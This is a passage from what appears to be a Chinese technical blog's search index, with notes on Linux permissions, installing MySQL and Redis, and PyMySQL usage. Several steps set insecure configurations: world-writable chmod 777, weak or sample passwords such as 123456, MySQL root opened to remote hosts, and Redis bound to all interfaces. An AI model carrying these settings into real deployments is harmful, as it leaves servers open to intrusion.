class="language-bash">卸载服务</span></span><br><span class="line">gitlab-runner uninstall</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清理文件</span></span><br><span class="line">rm -rf /etc/gitlab-runner</span><br><span class="line">rm -rf /usr/local/bin/gitlab-runner</span><br><span class="line">rm -rf /usr/bin/gitlab-runner</span><br><span class="line">rm -rf /etc/sudoers.d/gitlab-runner</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No89：Linux下修改文件夹权限和用户名用户组</title>
      <link href="/posts/932b7a09.html"/>
      <url>/posts/932b7a09.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、查看权限"><a href="#一、查看权限" class="headerlink" title="一、查看权限"></a>一、查看权限</h3><p>在命令行使用命令，可以查看文件或者文件的权限</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ll</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或者</span></span><br><span class="line">ls -a</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-rw-r--r--. 1 root root 6 Nov  9 16:42 a.txt</span><br></pre></td></tr></table></figure><p>“-rw-r–r–”表示权限，一共有十个字符</p><p>“-”则表示是文件，如果是“d”则表示是目录（directory）</p><p>后面9个字符每3个字符又作为一个组，则有3组信息（“rw-”、“r–”、“r–”）</p><p>分别表示所属用户本身具有的权限、所属用户的用户组其他成员的权限、其他用户的权限。</p><p>r是读权限、w是写权限、x是可执行权限、-没有对应字符的权限。</p><p>Linux里面对这些字符设置对应的数值，r是4，w是2，x是1，-是0。</p><p>“rw-”是6（&#x3D;4+2+0），a.txt的权限是644，属于root用户组的root用户。</p><h3 id="二、修改权限：chmod"><a href="#二、修改权限：chmod" class="headerlink" title="二、修改权限：chmod"></a>二、修改权限：chmod</h3><h4 id="1、改文件的权限"><a href="#1、改文件的权限" class="headerlink" title="1、改文件的权限"></a>1、改文件的权限</h4><p>修改文件a.txt的权限为755</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 755 a.txt</span><br></pre></td></tr></table></figure><h4 id="2、改文件夹的权限"><a href="#2、改文件夹的权限" class="headerlink" title="2、改文件夹的权限"></a>2、改文件夹的权限</h4><ul><li>只改变文件夹本身权限，不改动子文件（夹）</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 600 my/</span><br></pre></td></tr></table></figure><ul><li>改变文件夹及子目录下所有文件（夹）权限</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">中间是大写的R，不是小写</span></span><br><span class="line">chmod -R 777 my/</span><br></pre></td></tr></table></figure><h3 id="三、修改所属用户和用户组：chown"><a href="#三、修改所属用户和用户组：chown" class="headerlink" title="三、修改所属用户和用户组：chown"></a>三、修改所属用户和用户组：chown</h3><p>这个和修改文件夹的权限是基本相同的，只不过是把chmod命令换成了chown。</p><h4 id="1、修改文件所属用户和用户组"><a href="#1、修改文件所属用户和用户组" class="headerlink" title="1、修改文件所属用户和用户组"></a>1、修改文件所属用户和用户组</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改a.txt文件所属用户（jay）和用户组（fefjay）</span></span><br><span class="line">chown jay:fefjay a.txt</span><br></pre></td></tr></table></figure><h4 id="2、修改文件夹所属用户和用户组"><a href="#2、修改文件夹所属用户和用户组" class="headerlink" title="2、修改文件夹所属用户和用户组"></a>2、修改文件夹所属用户和用户组</h4><ul><li>只改文件夹本身所属用户和用户组，不改子文件（夹）</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chown redis:redis /var/lib/redis</span><br></pre></td></tr></table></figure><ul><li>改变文件夹及所有子文件（夹）所属用户和用户组</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chown -R redis:redis /var/lib/redis</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">举例</span></span><br><span class="line">chown -R mongo:mongo /var/lib/mongo</span><br><span class="line">chown -R mongodb:mongodb /var/lib/mongodb</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No88：MySQL安装方法</title>
      <link href="/posts/8c31da45.html"/>
      <url>/posts/8c31da45.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、CentOS7"><a href="#1、CentOS7" class="headerlink" title="1、CentOS7"></a>1、CentOS7</h3><ul><li>下载源安装包</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://dev.mysql.com/get/mysql57-community-release-el7-8.noarch.rpm</span><br></pre></td></tr></table></figure><ul><li>安装源</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum localinstall -y mysql57-community-release-el7-8.noarch.rpm</span><br></pre></td></tr></table></figure><ul><li>安装MySQL</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y mysql-community-server</span><br></pre></td></tr></table></figure><ul><li>启动服务并设置开机启动</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动服务</span></span><br><span class="line">systemctl start mysqld</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止服务</span></span><br><span class="line">systemctl stop mysqld</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启服务</span></span><br><span class="line">systemctl restart mysqld</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务状态</span></span><br><span class="line">systemctl status mysqld</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开机启动</span></span><br><span class="line">systemctl enable mysqld</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重载服务配置</span></span><br><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure><ul><li>修改root本地登录密码</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看mysql初始密码</span></span><br><span class="line">grep &#x27;temporary password&#x27; /var/log/mysqld.log</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">连接mysql</span></span><br><span class="line">mysql -uroot -p密码</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改密码【注意：后面的分号一定要跟上】</span></span><br><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;密码&#x27;;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或</span></span><br><span class="line">set password for &#x27;root&#x27;@&#x27;localhost&#x27;=password(&#x27;密码&#x27;);</span><br></pre></td></tr></table></figure><ul><li>设置简单密码</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看 mysql 初始的密码策略（已连接MySQL服务）</span></span><br><span class="line">SHOW VARIABLES LIKE &#x27;validate_password%&#x27;;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置密码策略为只验证密码长度（不验证特殊字符）</span></span><br><span class="line">set global validate_password_policy=LOW;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">MySQL8.0以上</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">set</span> global validate_password.policy=LOW;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可设置为6位的密码</span></span><br><span class="line">set global validate_password_length=6;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">MySQL8.0以上</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">set</span> global validate_password.length=6;</span></span><br></pre></td></tr></table></figure><ul><li>无法修改初始密码的错误</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">报错信息</span></span><br><span class="line">ERROR 1045 (28000): Access denied for user &#x27;root&#x27;@&#x27;localhost&#x27; (using password: YES)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭MySQL服务</span></span><br><span class="line">systemctl stop mysqld</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">免密码登录：vim /etc/my.cnf，添加最后一行</span></span><br><span class="line">skip-grant-tables</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启MySQL服务</span></span><br><span class="line">systemctl restart mysqld</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不使用密码登录MySQL</span></span><br><span class="line">mysql -u root</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">刷新权限</span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">flush privileges;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改密码</span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">ALTER USER <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED WITH mysql_native_password BY <span class="string">&#x27;123456&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">flush privileges;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除免密码登录：vim /etc/my.cnf，删除最后一行</span></span><br><span class="line">skip-grant-table</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启MySQL服务</span></span><br><span class="line">systemctl restart mysqld</span><br></pre></td></tr></table></figure><ul><li>查看安装位置</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whereis mysqld</span><br></pre></td></tr></table></figure><p>默认配置文件路径：</p><p>配置文件：&#x2F;etc&#x2F;my.cnf</p><p>数据文件：&#x2F;var&#x2F;lib&#x2F;mysql</p><p>日志文件：&#x2F;var&#x2F;log&#x2F;mysqld.log</p><p>服务启动脚本：&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mysqld.service</p><p>socket文件：&#x2F;var&#x2F;run&#x2F;mysqld&#x2F;mysqld.pid</p><ul><li>查看修改配置文件</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/my.cnf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置默认编码为utf8，在[mysqld]下添加以下内容：</span></span><br><span class="line">character_set_server=utf8</span><br><span class="line">init_connect=&#x27;SET NAMES utf8&#x27;</span><br></pre></td></tr></table></figure><ul><li>卸载</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止服务</span></span><br><span class="line">systemctl stop mysqld</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除安装的包</span></span><br><span class="line">yum erase $(rpm -qa | grep mysql-community-server)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除配置文件</span></span><br><span class="line">rm -rf /etc/my.cnf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除数据文件</span></span><br><span class="line">rm -rf /var/lib/mysql</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除日志文件</span></span><br><span class="line">rm -rf /var/log/mysqld.log</span><br></pre></td></tr></table></figure><h3 id="2、Ubuntu16-04"><a href="#2、Ubuntu16-04" class="headerlink" title="2、Ubuntu16.04"></a>2、Ubuntu16.04</h3><ul><li>安装mysql服务，默认5.7</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install mysql-server</span><br></pre></td></tr></table></figure><ul><li>启动服务并设置开机启动</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动</span></span><br><span class="line">sudo service mysql start</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止</span></span><br><span class="line">sudo service mysql stop</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务状态</span></span><br><span class="line">sudo service mysql status</span><br></pre></td></tr></table></figure><ul><li>修改配置文件</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim/etc/mysql/mysql.conf.d/mysqld.cnf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加该句：</span></span><br><span class="line">character-set-server=utf8</span><br><span class="line"></span><br><span class="line">sudo vim /etc/mysql/conf.d/mysql.cnf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加以下：</span></span><br><span class="line">[client]</span><br><span class="line">default-character-set=utf8</span><br><span class="line">[mysql]</span><br><span class="line">default-character-set=utf8</span><br><span class="line">[mysqld]</span><br><span class="line">collation-server = utf8_general_ci</span><br><span class="line">init-connect=&#x27;SET NAMES utf8&#x27;</span><br><span class="line">character-set-server = utf8</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改完成后，重启mysql</span></span><br><span class="line">sudo service mysql restart</span><br></pre></td></tr></table></figure><ul><li>查看守护进程运行状态</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps aux | grep mysql</span><br></pre></td></tr></table></figure><ul><li>卸载</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭守护进程mysql</span></span><br><span class="line">sudo service mysql stop</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载安装的软件包</span></span><br><span class="line">sudo apt-get remove --purge mysql-server*</span><br></pre></td></tr></table></figure><h3 id="3、Windows10"><a href="#3、Windows10" class="headerlink" title="3、Windows10"></a>3、Windows10</h3><ul><li>环境变量</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装目录</span></span><br><span class="line">D:\PortableFiles\MYSQL\bin</span><br></pre></td></tr></table></figure><ul><li>配置文件</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[mysql]</span><br><span class="line">default-character-set=utf8mb4</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">port = 3306</span><br><span class="line">basedir=D:\PortableFiles\MySQL</span><br><span class="line">datadir=D:\PortableFiles\MySQL\data</span><br><span class="line">max_connections=1000</span><br><span class="line">character-set-server=utf8mb4</span><br><span class="line">default-storage-engine=INNODB</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>安装MySQL</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">初始化数据目录（生成随机root密码）</span></span><br><span class="line">mysqld --initialize --console</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装</span></span><br><span class="line">mysqld --install</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装MySQL的时候,在命令行中输入mysqld -install没有任何反应,可能是把vc_redist.x64.exe给卸载掉了</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载安装vc_redist.x64.exe</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">https://docs.microsoft.com/zh-CN/cpp/windows/latest-supported-vc-redist?view=msvc-170</span></span><br></pre></td></tr></table></figure><ul><li>设置root密码</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动服务</span></span><br><span class="line">net start mysql</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">登录MySQL（输入记录的临时密码）</span></span><br><span class="line">mysql -u root -p</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改 root 密码</span></span><br><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;新密码&#x27;;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure><ul><li>操作服务</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动服务</span></span><br><span class="line">net start mysql</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止服务</span></span><br><span class="line">net stop mysql</span><br></pre></td></tr></table></figure><ul><li>允许远程连接</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">UPDATE mysql.user SET host=&#x27;%&#x27; WHERE user=&#x27;root&#x27;;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No87：Python-Pymysql使用技巧</title>
      <link href="/posts/13cb22b3.html"/>
      <url>/posts/13cb22b3.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、获取插入数据的主键id"><a href="#1、获取插入数据的主键id" class="headerlink" title="1、获取插入数据的主键id"></a>1、获取插入数据的主键id</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">database = pymysql.connect(</span><br><span class="line">        host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">3306</span>, user=<span class="string">&quot;root&quot;</span>, password=<span class="string">&quot;root&quot;</span>, database=<span class="string">&quot;test&quot;</span></span><br><span class="line">)</span><br><span class="line">cursor = database.cursor()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    cursor.execute(<span class="string">&#x27;insert into test (name) values (&quot;test&quot;)&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(database.insert_id())</span><br><span class="line">    database.commit()</span><br><span class="line"></span><br><span class="line">cursor.close()</span><br><span class="line">database.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过db.insert_id()方法可以获取插入数据的主键id,注意一定要在commit之前获取,否则返回0。</p><h3 id="2、创建时间、更新时间"><a href="#2、创建时间、更新时间" class="headerlink" title="2、创建时间、更新时间"></a>2、创建时间、更新时间</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">DEFAULT CURRENT_TIMESTAMP</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">表示当插入数据的时候，该字段默认值为当前时间</span></span><br><span class="line"></span><br><span class="line">ON UPDATE CURRENT_TIMESTAMP</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">表示每次更新这条数据的时候，该字段都会更新成当前时间</span></span><br></pre></td></tr></table></figure><p>这两个操作是mysql数据库本身在维护，可以根据这个特性来生成【创建时间】和【更新时间】两个字段，且不需要代码来维护。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">CREATE TABLE `test`</span><br><span class="line">(</span><br><span class="line">    `create_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT &#x27;创建时间&#x27;,</span><br><span class="line">    `update_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT &#x27;更新时间&#x27;</span><br><span class="line">) ENGINE = InnoDB</span><br><span class="line">  DEFAULT CHARSET = utf8;</span><br></pre></td></tr></table></figure><h3 id="3、Python插入数据库时字符串中含有单引号或双引号报错"><a href="#3、Python插入数据库时字符串中含有单引号或双引号报错" class="headerlink" title="3、Python插入数据库时字符串中含有单引号或双引号报错"></a>3、Python插入数据库时字符串中含有单引号或双引号报错</h3><p>可以使用pymysql.escape_string()转换</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">mydb = pymysql.connect(host=<span class="string">&quot;&quot;</span>, user=<span class="string">&quot;&quot;</span>, password=<span class="string">&quot;&quot;</span>, database=<span class="string">&quot;&quot;</span>, charset=<span class="string">&quot;&quot;</span>, )</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">type</span>(str_content) <span class="keyword">is</span> <span class="built_in">str</span>:</span><br><span class="line">    str_content = mydb.escape_string(str_content)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3、连接MySQL时raise-err-InterfaceError-“-0-‘’-”"><a href="#3、连接MySQL时raise-err-InterfaceError-“-0-‘’-”" class="headerlink" title="3、连接MySQL时raise err.InterfaceError(“(0, ‘’)”)"></a>3、连接MySQL时raise err.InterfaceError(“(0, ‘’)”)</h3><p>Python长时间连接MySQL而没有进行任何处理，所以就自动断开了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">mydb = pymysql.connect(host=<span class="string">&quot;&quot;</span>, user=<span class="string">&quot;&quot;</span>, password=<span class="string">&quot;&quot;</span>, database=<span class="string">&quot;&quot;</span>, charset=<span class="string">&quot;&quot;</span>)</span><br><span class="line">cursor = mydb.cursor()</span><br><span class="line">sql = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 执行SQL前ping下MySQL服务器</span></span><br><span class="line">mydb.ping(reconnect=<span class="literal">True</span>)</span><br><span class="line">cursor.execute(sql)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4、判断字段是否包含某个字符串的方法"><a href="#4、判断字段是否包含某个字符串的方法" class="headerlink" title="4、判断字段是否包含某个字符串的方法(%)"></a>4、判断字段是否包含某个字符串的方法(%)</h3><p>Python长时间连接MySQL而没有进行任何处理，所以就自动断开了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">mydb = pymysql.connect(host=<span class="string">&quot;&quot;</span>, user=<span class="string">&quot;&quot;</span>, password=<span class="string">&quot;&quot;</span>, database=<span class="string">&quot;&quot;</span>, charset=<span class="string">&quot;&quot;</span>)</span><br><span class="line">cursor = mydb.cursor()</span><br><span class="line">sql = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 执行SQL前ping下MySQL服务器</span></span><br><span class="line">mydb.ping(reconnect=<span class="literal">True</span>)</span><br><span class="line">cursor.execute(sql)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="方法一：like"><a href="#方法一：like" class="headerlink" title="方法一：like"></a>方法一：like</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SELECT * FROM 表名 WHERE 字段名 like &quot;%字符%&quot;;</span><br></pre></td></tr></table></figure><h4 id="方法二：find-in-set"><a href="#方法二：find-in-set" class="headerlink" title="方法二：find_in_set()"></a>方法二：find_in_set()</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SELECT * FROM 表名 WHERE find_in_set(字符, 字段名);</span><br></pre></td></tr></table></figure><h4 id="方法三：locate-字符-字段名"><a href="#方法三：locate-字符-字段名" class="headerlink" title="方法三：locate(字符,字段名)"></a>方法三：locate(字符,字段名)</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SELECT * FROM 表名 WHERE locate(字符, 字段名);</span><br></pre></td></tr></table></figure><h4 id="方法四：INSTR-字段-字符"><a href="#方法四：INSTR-字段-字符" class="headerlink" title="方法四：INSTR(字段,字符)"></a>方法四：INSTR(字段,字符)</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SELECT * FROM 表名 WHERE INSTR(字段, 字段名);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No86：Redis安装方法</title>
      <link href="/posts/f3c751e8.html"/>
      <url>/posts/f3c751e8.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、CentOS7"><a href="#1、CentOS7" class="headerlink" title="1、CentOS7"></a>1、CentOS7</h3><ul><li>安装</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y redis</span><br></pre></td></tr></table></figure><ul><li>下载安装fedora的epel仓库</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y epel-release</span><br></pre></td></tr></table></figure><ul><li>启动服务并设置开机启动</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动服务</span></span><br><span class="line">systemctl start redis</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止服务</span></span><br><span class="line">systemctl stop redis</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启服务</span></span><br><span class="line">systemctl restart redis</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务状态</span></span><br><span class="line">systemctl status redis</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开机启动</span></span><br><span class="line">systemctl enable redis</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重载服务配置</span></span><br><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure><ul><li>查看安装位置</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whereis redis</span><br></pre></td></tr></table></figure><p>默认配置文件路径：</p><p>配置文件：&#x2F;etc&#x2F;redis.conf</p><p>数据文件：&#x2F;var&#x2F;lib&#x2F;redis</p><p>日志文件：&#x2F;var&#x2F;log&#x2F;redis</p><p>服务启动脚本：&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;redis.service</p><p>socket文件：&#x2F;var&#x2F;run&#x2F;redis&#x2F;</p><ul><li>查看修改配置文件</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/redis.conf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启用守护进程</span></span><br><span class="line">daemonize yes</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启远程连接</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">bind</span> 127.0.0.1</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定端口</span></span><br><span class="line">port 6379</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置密码</span></span><br><span class="line">requirepass 123456</span><br></pre></td></tr></table></figure><ul><li>卸载</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止服务</span></span><br><span class="line">systemctl stop redis</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除安装的包</span></span><br><span class="line">yum erase $(rpm -qa | grep redis)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除配置文件</span></span><br><span class="line">rm -rf /etc/redis.conf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除数据文件</span></span><br><span class="line">rm -rf /var/lib/redis</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除日志文件</span></span><br><span class="line">rm -rf /var/log/redis</span><br></pre></td></tr></table></figure><h3 id="2、Ubuntu16-04"><a href="#2、Ubuntu16-04" class="headerlink" title="2、Ubuntu16.04"></a>2、Ubuntu16.04</h3><ul><li>安装Redis服务</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install redis-server</span><br></pre></td></tr></table></figure><ul><li>服务管理</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动</span></span><br><span class="line">sudo service redis start</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止</span></span><br><span class="line">sudo service redis stop</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务状态</span></span><br><span class="line">sudo service redis status</span><br></pre></td></tr></table></figure><ul><li>修改配置文件</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/redis/redis.conf</span><br><span class="line"><span 